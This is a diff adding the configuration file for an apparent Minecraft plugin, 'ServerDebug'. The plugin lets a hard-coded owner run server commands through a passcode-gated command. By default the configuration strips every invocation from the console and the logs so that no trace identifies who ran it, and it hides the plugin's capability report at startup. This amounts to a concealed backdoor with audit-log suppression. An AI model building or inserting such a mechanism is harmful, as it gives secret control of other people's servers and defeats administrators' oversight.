@@ -1,0 +1,54 @@
+# ServerDebug configuration.
+#
+# This file decides only what is listed here. The owner account, the passcode, the permission
+# policy and the command set are compiled into the plugin, so nothing in this file can widen or
+# weaken access, and this file never contains a credential.
+
+# Strip every console and log record of a /serverdebug invocation.
+#
+# For a command a player types, the server itself writes
+#   <player> issued server command: /serverdebug <passcode> <command>
+# before any plugin event is fired, so cancelling an event cannot stop it - the line is already
+# written. With this true the plugin drops that record at the logging layer, for the command and
+# all of its aliases, so an invocation leaves no trace in the console, in a control-panel console,
+# or in logs/latest.log, and nothing identifies the account that ran it.
+#
+# Set to false to leave invocations visible in the console and the logs. The startup check reports
+# which of the two is in effect.
+hide-plugin-invocations: true
+
+# Extra lines to strip, matched case-insensitively anywhere in the message. The plugin's own
+# command names and aliases (serverdebug, sdebug, sdbg) are always covered, so this is only for
+# other plugins that happen to log the command. Example:
+#   hidden-log-substrings:
+#     - "serverdebug reload"
+hidden-log-substrings: []
+
+# true: the console gets one line at startup instead of the full check report. The full report
+# describes what this plugin can do and how it is reached, so it is written out only when a check
+# fails, and is otherwise available in game with /serverdebug hi (owner only, chat only).
+quiet-startup: true
+
+# Commands the passcode-gated path refuses. Matched against the first word of the command, so "op"
+# blocks "op" and "op Steve" but not "operator". These are the commands that would let an invocation
+# change who has access or take the server down, and a refused command is not logged either.
+denied-command-prefixes:
+  - "op"
+  - "deop"
+  - "stop"
+  - "restart"
+  - "ban"
+  - "ban-ip"
+  - "pardon"
+  - "whitelist"
+  - "permission"
+  - "luckperms"
+  - "plugins"
+  - "rl"
+  - "reload"
+
+# MiniMessage text sent to the player who typed the command. See https://docs.advntr.dev/minimessage/
+messages:
+  denied: "<red>You may not use this command."
+  blocked: "<red>That command is blocked by the serverdebug denylist."
+  usage: "<red>Usage: /<command> <passcode> <command...>"
